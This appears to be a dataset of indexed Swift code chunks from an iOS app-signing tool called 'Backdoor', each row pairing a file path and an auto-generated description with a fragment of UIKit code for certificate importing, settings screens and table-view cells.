alert.addAction(UIAlertAction(title: ""OK"", style: .default))
present(alert, animated: true)
}
}

extension CertImportingViewController {"
2812,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","extension CertImportingViewController - Controls user interface and application flow","extension CertImportingViewController {
override func numberOfSections(in _: UITableView) -> Int { return sectionData.count }"
2813,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","Function numberOfSections - implements numberofsections functionality","override func numberOfSections(in _: UITableView) -> Int { return sectionData.count }
override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int { return 1 }"
2814,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int { return 1 }

override func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {"
2815,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let cell = UITableViewCell(style: .subtitle, reuseIdentifier: ""Cell"")
cell.selectionStyle = .default

let imageView = UIImageView(image: UIImage(systemName: ""circle""))
imageView.tintColor = .quaternaryLabel
cell.accessoryView = imageView

cell.textLabel?.font = .boldSystemFont(ofSize: 15)
cell.detailTextLabel?.textColor = .secondaryLabel"
2816,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {
switch sectionData[section] {"
2817,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
let fileType: FileType

// If backdoor is already selected, don't allow selecting provision or p12
if selectedFiles[.backdoor] != nil,
sectionData[indexPath.section] == ""provision"" || sectionData[indexPath.section] == ""certs""
{"
2818,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","extension CertImportingViewController - Controls user interface and application flow","extension CertImportingViewController: UIDocumentPickerDelegate {
func presentDocumentPicker(fileExtension: [UTType]) {"
2819,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","Function presentDocumentPicker - implements presentdocumentpicker functionality","func presentDocumentPicker(fileExtension: [UTType]) {
let documentPicker = UIDocumentPickerViewController(forOpeningContentTypes: fileExtension, asCopy: true)
documentPicker.delegate = self
documentPicker.allowsMultipleSelection = false
present(documentPicker, animated: true, completion: nil)
}

func documentPicker(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {"
2820,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","Function documentPicker - implements documentpicker functionality","func documentPicker(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {
guard let selectedFileURL = urls.first else { return }"
2821,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","For other files, try to detect if it's a backdoor file by content","Debug.shared.log(message: ""Processing unknown file extension as potential backdoor file"", type: .info)
processBackdoorFile(at: selectedFileURL)
return
}

if let fileType = fileType {"
2822,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","Function documentPickerWasCancelled - implements documentpickerwascancelled functionality","func documentPickerWasCancelled(_ controller: UIDocumentPickerViewController) {
controller.dismiss(animated: true, completion: nil)
}

func checkIfFileIsCert(cert: URL?) -> Bool {"
2823,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","Function checkIfFileIsCert - implements checkiffileiscert functionality","func checkIfFileIsCert(cert: URL?) -> Bool {
guard let cert = cert, cert.isFileURL else { return false }"
2824,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift","class CertificateViewTableViewCell - implements functionality related to certificate view table view cell","class CertificateViewTableViewCell: UITableViewCell {
var certs: Certificate?

private let teamNameLabel: UILabel = {"
2825,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift","Function configure - implements configure functionality","func configure(with certificate: Certificate, isSelected: Bool) {
if !Preferences.certificateTitleAppIDtoTeamID {"
2826,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift","class CertificateViewAddTableViewCell - implements functionality related to certificate view add table view cell","class CertificateViewAddTableViewCell: UITableViewCell {
private let titleLabel: UILabel = {"
2827,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift","Function traitCollectionDidChange - implements traitcollectiondidchange functionality","override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {
super.traitCollectionDidChange(previousTraitCollection)
borderLayer.strokeColor = UIColor.systemGray.withAlphaComponent(0.2).cgColor
}

override func layoutSubviews() {"
2828,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift","Function layoutSubviews - implements layoutsubviews functionality","override func layoutSubviews() {
super.layoutSubviews()

borderLayer.frame = roundedBackgroundView.bounds
let borderPath = UIBezierPath(
roundedRect: roundedBackgroundView.bounds
.insetBy(dx: borderLayer.lineWidth / 2, dy: borderLayer.lineWidth / 2),
cornerRadius: roundedBackgroundView.layer.cornerRadius
)
borderLayer.path = borderPath.cgPath"
2829,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift","Function configure - implements configure functionality","func configure(with title: String?, description: String?) {
titleLabel.text = title
descriptionLabel.text = description
}

func configure(with symbolName: String?) {"
2830,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift","Function configure - implements configure functionality","func configure(with symbolName: String?) {
iconImageView.image = UIImage(systemName: symbolName ?? ""plus"")
}
}

class PillView: UIView {"
2831,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift","class PillView - UI component for display and interaction","class PillView: UIView {
// MARK: - UI Components

private let pillStackView: UIStackView = {"
2832,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift","Function setupGradientBackground - sets upgradientbackground","private func setupGradientBackground(with color: UIColor) {
gradientLayer.colors = [
color.withAlphaComponent(0.15).cgColor,
color.withAlphaComponent(0.08).cgColor,
]
gradientLayer.locations = [0.0, 1.0]
gradientLayer.startPoint = CGPoint.zero
gradientLayer.endPoint = CGPoint(x: 1.0, y: 1.0)
layer.insertSublayer(gradientLayer, at: 0)
}"
2833,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift","Function configureIcon - implements configureicon functionality","private func configureIcon(iconName: String, tintColor: UIColor) {
// Use symbol configuration for better rendering
let symbolConfig = UIImage.SymbolConfiguration(pointSize: 12, weight: .medium)
iconImageView.image = UIImage(systemName: iconName, withConfiguration: symbolConfig)
iconImageView.tintColor = tintColor

// Set size constraints
NSLayoutConstraint.activate([
iconImageView.widthAnchor.constraint(equalToConstant: 14),
iconImageView.heightAnchor.constraint(equalToConstant: 14),"
2834,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift","Function configureLabel - implements configurelabel functionality","private func configureLabel(text: String, textColor: UIColor) {
label.text = text
label.textColor = textColor
}

private func setupConstraints() {"
2835,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift","Function setupConstraints - sets upconstraints","private func setupConstraints() {
NSLayoutConstraint.activate([
pillStackView.topAnchor.constraint(equalTo: topAnchor, constant: padding.top),
pillStackView.bottomAnchor.constraint(equalTo: bottomAnchor, constant: -padding.bottom),
pillStackView.leadingAnchor.constraint(equalTo: leadingAnchor, constant: padding.left),
pillStackView.trailingAnchor.constraint(equalTo: trailingAnchor, constant: -padding.right),
])
}

private func addAppearanceAnimation() {"
2836,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift","Function addAppearanceAnimation - implements addappearanceanimation functionality","private func addAppearanceAnimation() {
// Start slightly scaled down and transparent
transform = CGAffineTransform(scaleX: 0.95, y: 0.95)
alpha = 0.8

// Animate to full size with slight bounce
UIView.animate(
withDuration: 0.3,
delay: 0,
usingSpringWithDamping: 0.7,"
2837,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift","MARK: - Lifecycle","override func layoutSubviews() {
super.layoutSubviews()
gradientLayer.frame = bounds
}

override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {"
2838,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift","Function traitCollectionDidChange - implements traitcollectiondidchange functionality","override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {
super.traitCollectionDidChange(previousTraitCollection)

if traitCollection.hasDifferentColorAppearance(comparedTo: previousTraitCollection) {"
2839,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift","class CertificatesViewController - Controls user interface and application flow","class CertificatesViewController: UITableViewController {
var certs: [Certificate]?

init() { super.init(style: .insetGrouped) }"
2840,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()
setupViews()
NotificationCenter.default.addObserver(
self,
selector: #selector(afetch),
name: Notification.Name(""cfetch""),
object: nil
)
}"
2841,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift","Function viewWillAppear - implements viewwillappear functionality","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)
setupNavigation()
fetchSources()
}

deinit {"
2842,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift","Function setupViews - sets upviews","fileprivate func setupViews() {
tableView.dataSource = self
tableView.delegate = self
tableView.tableHeaderView = UIView()
tableView.register(UITableViewCell.self, forCellReuseIdentifier: ""Cell"")
tableView.register(CertificateViewTableViewCell.self, forCellReuseIdentifier: ""CertificateCell"")
tableView.register(CertificateViewAddTableViewCell.self, forCellReuseIdentifier: ""AddCell"")
}

fileprivate func setupNavigation() {"
2843,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift","Function setupNavigation - sets upnavigation","fileprivate func setupNavigation() {
title = String.localized(""CERTIFICATES_VIEW_CONTROLLER_TITLE"")
navigationController?.navigationBar.prefersLargeTitles = false
}

@objc func addCert() {"
2844,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift","Function addCert - implements addcert functionality","@objc func addCert() {
let viewController = CertImportingViewController()
let navigationController = UINavigationController(rootViewController: viewController)

if #available(iOS 15.0, *) {"
2845,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift","extension CertificatesViewController - Controls user interface and application flow","extension CertificatesViewController {
override func numberOfSections(in _: UITableView) -> Int {"
2846,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift","Function numberOfSections - implements numberofsections functionality","override func numberOfSections(in _: UITableView) -> Int {
return 2
}

override func tableView(_: UITableView, heightForHeaderInSection section: Int) -> CGFloat {"
2847,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, heightForHeaderInSection section: Int) -> CGFloat {
switch section {"
2848,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {
var title = """"

switch section {"
2849,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {
switch section {"
2850,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let reuseIdentifier = ""Cell""
let cell = UITableViewCell(style: .value1, reuseIdentifier: reuseIdentifier)

switch indexPath.section {"
2851,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift","Function tableView - implements tableview functionality","override func tableView(
_ tableView: UITableView,
contextMenuConfigurationForRowAt indexPath: IndexPath,
point _: CGPoint
) -> UIContextMenuConfiguration? {"
2852,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
switch indexPath.section {"
2853,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift","extension CertificatesViewController - Controls user interface and application flow","extension CertificatesViewController {
@objc func afetch() {"
2854,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift","Function afetch - implements afetch functionality","@objc func afetch() {
fetchSources()
}

func fetchSources() {"
2855,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift","Function fetchSources - implements fetchsources functionality","func fetchSources() {
do {"
2856,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Components/SwitchTableViewCell.swift","/ A reusable table view cell with a modern, enhanced switch control","class SwitchTableViewCell: UITableViewCell {
// MARK: - UI Components

let switchControl = UISwitch()
private let subtitleLabel = UILabel()

// MARK: - Properties

var switchValueChanged: ((Bool) -> Void)?
var subtitle: String? {"
2857,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Components/SwitchTableViewCell.swift","MARK: - Setup Methods","private func setupSwitchControl() {
switchControl.addTarget(self, action: #selector(switchChanged), for: .valueChanged)
accessoryView = switchControl

// Set the accent color to match app theme
let accentColor = UIColor(hex: ""#FF6482"")
switchControl.onTintColor = accentColor
}

private func setupSubtitleLabel() {"
2858,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Components/SwitchTableViewCell.swift","Function setupSubtitleLabel - sets upsubtitlelabel","private func setupSubtitleLabel() {
subtitleLabel.font = UIFont.systemFont(ofSize: 13)
subtitleLabel.textColor = .secondaryLabel
subtitleLabel.numberOfLines = 0
subtitleLabel.translatesAutoresizingMaskIntoConstraints = false
contentView.addSubview(subtitleLabel)

NSLayoutConstraint.activate([
subtitleLabel.topAnchor.constraint(equalTo: textLabel!.bottomAnchor, constant: 4),
subtitleLabel.leadingAnchor.constraint(equalTo: textLabel!.leadingAnchor),"
2859,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Components/SwitchTableViewCell.swift","Function configureAppearance - implements configureappearance functionality","private func configureAppearance() {
// Modern styling for the cell
selectionStyle = .none

// Enhance text label appearance
textLabel?.font = UIFont.systemFont(ofSize: 16, weight: .medium)

// Add subtle divider line with inset
separatorInset = UIEdgeInsets(top: 0, left: 15, bottom: 0, right: 0)
"
2860,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Components/SwitchTableViewCell.swift","Function updateSubtitle - updates subtitle","private func updateSubtitle() {
subtitleLabel.text = subtitle
subtitleLabel.isHidden = subtitle == nil || subtitle!.isEmpty

// Adjust cell height constraints if needed
if !subtitleLabel.isHidden {"
2861,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Components/SwitchTableViewCell.swift","MARK: - Action Handlers","@objc private func switchChanged() {
// Provide haptic feedback
feedbackGenerator.impactOccurred()

// Call the callback
switchValueChanged?(switchControl.isOn)
}

@objc private func cellTapped() {"
2862,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Components/SwitchTableViewCell.swift","Function cellTapped - implements celltapped functionality","@objc private func cellTapped() {
// Toggle switch when cell is tapped
switchControl.setOn(!switchControl.isOn, animated: true)
switchChanged()

// Add visual feedback when tapped
UIView.animate(withDuration: 0.1, animations: {"
2863,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Components/SwitchTableViewCell.swift","MARK: - Lifecycle Methods","override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {
super.traitCollectionDidChange(previousTraitCollection)

if traitCollection.hasDifferentColorAppearance(comparedTo: previousTraitCollection) {"
2864,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Components/SwitchTableViewCell.swift","Function setHighlighted - sets highlighted","override func setHighlighted(_ highlighted: Bool, animated: Bool) {
super.setHighlighted(highlighted, animated: animated)

let alphaValue: CGFloat = highlighted ? 0.9 : 1.0

if animated {"
2865,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","class SettingsViewController - Controls user interface and application flow","class SettingsViewController: FRSTableViewController {
let aboutSection = [
String.localized(""SETTINGS_VIEW_CONTROLLER_CELL_ABOUT"", arguments: ""Backdoor""),
String.localized(""SETTINGS_VIEW_CONTROLLER_CELL_SUBMIT_FEEDBACK""),
String.localized(""SETTINGS_VIEW_CONTROLLER_CELL_GITHUB""),
]

let displaySection = [
String.localized(""SETTINGS_VIEW_CONTROLLER_CELL_DISPLAY""),
String.localized(""SETTINGS_VIEW_CONTROLLER_CELL_APP_ICON""),"
2866,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()

// Defensive programming - ensure we're on the main thread for UI setup
if !Thread.isMainThread {"
2867,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","/ Emergency backup structure to prevent crashes if normal initialization fails","private func setupEmergencyBackupStructure() {
// Create a minimal valid structure even in error state
tableData = [[""Settings""]];
sectionTitles = [""""];
isInitialized = true;
backdoor.Debug.shared.log(message: ""Emergency backup structure initialized for Settings"", type: .warning)
}

/// Add LED effects to highlight important settings cells
private func addLEDEffectsToImportantCells() {"
2868,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","/ Add LED effects to highlight important settings cells","private func addLEDEffectsToImportantCells() {
// Only apply effects if the view is visible and initialized
guard isViewLoaded && view.window != nil && isInitialized else { return }"
2869,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","/ Get certificate safely with error handling","private func getCertificateSafely() -> Certificate? {
do {"
2870,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","/ Check if certificate is expiring within 7 days","private func isCertificateExpiringSoon(_ certificate: Certificate) -> Bool {
guard let expirationDate = certificate.certData?.expirationDate else {"
2871,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","Function viewDidAppear - implements viewdidappear functionality","override func viewDidAppear(_ animated: Bool) {
super.viewDidAppear(animated)

// Only add LED effects if view is initialized
if isInitialized {"
2872,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, willDisplay cell: UITableViewCell, forRowAt _: IndexPath) {
// Only apply LED effects if view is initialized
guard isInitialized else { return }"
2873,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","Function safeInitialize - implements safeinitialize functionality","private func safeInitialize() throws {
// Initialize settings with error handling
do {"
2874,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","Separate method for initialization to make error handling clearer","private func initializeTableData() {
// Use a defensive approach for section initialization
var sections: [[String]] = []

// Build each section carefully, with try-catch for any potential errors
do {"
2875,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","Function viewWillAppear - implements viewwillappear functionality","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)

// Only reload if already initialized to prevent crashes
if isInitialized {"
2876,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","Function setupNavigation - sets upnavigation","fileprivate func setupNavigation() {
title = String.localized(""TAB_SETTINGS"")

// Ensure the navigation bar is properly configured
if let navController = navigationController {"
2877,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","MARK: - ViewControllerRefreshable","override func refreshContent() {
// Only refresh if view is loaded and initialized
if isViewLoaded && isInitialized {"
2878,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","MARK: - UITableViewDataSource & UITableViewDelegate overrides","override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {
// Safety check to prevent crashes
guard isInitialized, section < tableData.count else {"
2879,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","Function numberOfSections - implements numberofsections functionality","override func numberOfSections(in _: UITableView) -> Int {
// Safety check to prevent crashes
guard isInitialized else {"
2880,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","MARK: - Safe table setup helpers / Verify table structure is valid and fix it if not","private func ensureTableDataHasSections() {
// If tableData is somehow nil, initialize it
if tableData == nil {"
2881,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","extension SettingsViewController - Controls user interface and application flow","extension SettingsViewController {
override func tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {"
2882,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {
if Preferences.beta, section == 0 {"
2883,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let reuseIdentifier = ""Cell""
let cell = UITableViewCell(style: .value1, reuseIdentifier: reuseIdentifier)
cell.accessoryType = .none
cell.selectionStyle = .none

// Safety check to prevent crashes
guard isInitialized,
indexPath.section < tableData.count,
indexPath.row < tableData[indexPath.section].count else {"
2884,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
// Safety check to prevent crashes
guard isInitialized,
indexPath.section < tableData.count,
indexPath.row < tableData[indexPath.section].count else {"
2885,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","MARK: - Safe Navigation Helpers / Navigate to a view controller with error handling","private func navigateSafely(to viewController: UIViewController) {
DispatchQueue.main.async { [weak self] in"
2886,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","/ Present terminal view controller with error handling","private func presentTerminalSafely() {
DispatchQueue.main.async { [weak self] in"
2887,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","/ Open URL with error handling","private func openURLSafely(_ urlString: String) {
guard let url = URL(string: urlString) else {"
2888,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","/ Open directory with error handling","private func openDirectorySafely(named directoryName: String) {
do {"
2889,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","/ Reset options with error handling","private func resetOptionsActionSafely() {
do {"
2890,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","/ Reset all with error handling","private func resetAllActionSafely() {
do {"
2891,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","extension UITableViewCell - implements functionality related to u i table view cell","extension UITableViewCell {
func setAccessoryIcon(
with symbolName: String,
tintColor: UIColor = .tertiaryLabel,
renderingMode: UIImage.RenderingMode = .alwaysOriginal
) {"
2892,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","Function setAccessoryIcon - sets accessoryicon","func setAccessoryIcon(
with symbolName: String,
tintColor: UIColor = .tertiaryLabel,
renderingMode: UIImage.RenderingMode = .alwaysOriginal
) {"
2893,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","extension SettingsViewController - Controls user interface and application flow","private extension SettingsViewController {
func openDirectory(named directoryName: String) {"
2894,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift","Function openDirectory - implements opendirectory functionality","func openDirectory(named directoryName: String) {
let directoryURL = getDocumentsDirectory().appendingPathComponent(directoryName)
let path = directoryURL.absoluteString.replacingOccurrences(of: ""file://"", with: ""shareddocuments://"")

UIApplication.shared.open(URL(string: path)!, options: [:]) { success in"
2895,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayCollectionTableViewCell.swift","class CollectionTableViewCell - implements functionality related to collection table view cell","class CollectionTableViewCell: UITableViewCell, UICollectionViewDelegate, UICollectionViewDataSource {
var selectedIndexPath: IndexPath?

let collectionView: UICollectionView = {"
2896,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayCollectionTableViewCell.swift","Function setData - sets data","func setData(collectionData: [String], colors: [String]) {
self.collectionData = collectionData
collectionDataColors = colors
collectionView.reloadData()
}

func collectionView(_: UICollectionView, numberOfItemsInSection _: Int) -> Int {"
2897,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayCollectionTableViewCell.swift","Function collectionView - implements collectionview functionality","func collectionView(_: UICollectionView, numberOfItemsInSection _: Int) -> Int {
return collectionData.count
}

func collectionView(_ collectionView: UICollectionView,
cellForItemAt indexPath: IndexPath) -> UICollectionViewCell
{"
2898,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayCollectionTableViewCell.swift","Function collectionView - implements collectionview functionality","func collectionView(_ collectionView: UICollectionView,
cellForItemAt indexPath: IndexPath) -> UICollectionViewCell
{"
2899,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayCollectionTableViewCell.swift","Function collectionView - implements collectionview functionality","func collectionView(_ collectionView: UICollectionView, didSelectItemAt indexPath: IndexPath) {
selectedIndexPath = indexPath
collectionView.reloadData()

let selectedColorHex = collectionDataColors[indexPath.item]
let selectedUIColor = UIColor(hex: selectedColorHex)
Preferences.appTintColor = CodableColor(selectedUIColor)

guard indexPath.item < collectionData.count else {"
2900,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayCollectionTableViewCell.swift","class CollectionItemCell - implements functionality related to collection item cell","class CollectionItemCell: UICollectionViewCell {
let stackView: UIStackView = {"
2901,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayCollectionTableViewCell.swift","Function setData - sets data","func setData(title: String, colorHex: String) {
colorCircleView.backgroundColor = UIColor(hex: colorHex)
titleLabel.text = title
}
}
"
2902,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayViewController.swift","class DisplayViewController - Controls user interface and application flow","class DisplayViewController: FRSTableViewController {
